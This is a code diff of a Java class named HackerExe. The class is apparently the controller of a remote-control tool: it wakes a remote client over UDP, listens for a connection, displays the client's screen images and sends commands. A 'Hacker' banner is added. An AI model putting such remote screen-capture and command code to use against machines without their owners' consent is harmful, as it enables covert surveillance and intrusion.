@@ -42,7 +42,6 @@ public class HackerExe {
 
 	private String ipClient;
 	private int portClient;
-	private int portTelecommandeClient = 54322;
 
 	private static ServerSocket listenSocket;
 	private static Socket socketConnexion;
@@ -51,8 +50,16 @@ public class HackerExe {
 	
 	public static void main (String [] args) throws IOException, InterruptedException {
 		HackerExe h = new HackerExe();
-		//h.wakeUpClient();
-
+		System.out.println("	  _   _            _             ");
+		System.out.println("	 | | | |          | |            ");
+		System.out.println("	 | |_| | __ _  ___| | _____ _ __ ");
+		System.out.println("	 |  _  |/ _` |/ __| |/ / _ \\ '__|");
+		System.out.println("	 | | | | (_| | (__|   <  __/ |   ");
+		System.out.println("	 \\_| |_/\\__,_|\\___|_|\\_\\___|_|   ");
+		System.out.println("\n\t ______________________________\n");
+		System.out.println("Serveur en écoute sur le port : " + portServeur);
+		
+		h.wakeUpClient();
 		h.initListen();
 		h.getClientScreenResolution();
 		h.execute();
@@ -99,7 +106,7 @@ public class HackerExe {
 				    	 
 				    	 while (true) {
 					    	 try { printClientInterface(); } 
-					    	 catch (IOException e) { e.printStackTrace(); break; } 
+					    	 catch (IOException | InterruptedException e) { e.printStackTrace(); break; } 
 				    	 }
 				     }
 				}).start();
@@ -109,7 +116,8 @@ public class HackerExe {
 	
 
 
-	private static void printClientInterface() throws IOException {
+	private static void printClientInterface() throws IOException, InterruptedException {
+		while(true) {
 			String msg = new String();
 			try { msg = receiveTCP();} 
 			catch (Exception e) { e.printStackTrace(); /*System.exit(0);*/ }
@@ -118,6 +126,7 @@ public class HackerExe {
 			    BufferedImage img = ImageIO.read(ImageIO.createImageInputStream(socketConnexion.getInputStream()));
 			    fcs.getLblImage().setIcon(new ImageIcon(img));
 			}
+		}
 	}
 	
 
@@ -171,7 +180,7 @@ public class HackerExe {
 		 byte[] bufR = new byte[2048];
 		 DatagramPacket dpR = new DatagramPacket(bufR, bufR.length);
 		 bufR = new String(msg).getBytes();
-		 dpR = new DatagramPacket(bufR, bufR.length, new InetSocketAddress(ipClient, portTelecommandeClient));
+		 dpR = new DatagramPacket(bufR, bufR.length, new InetSocketAddress(ipClient, 54321));
 		 socket_send.send(dpR);		
 	}
 	
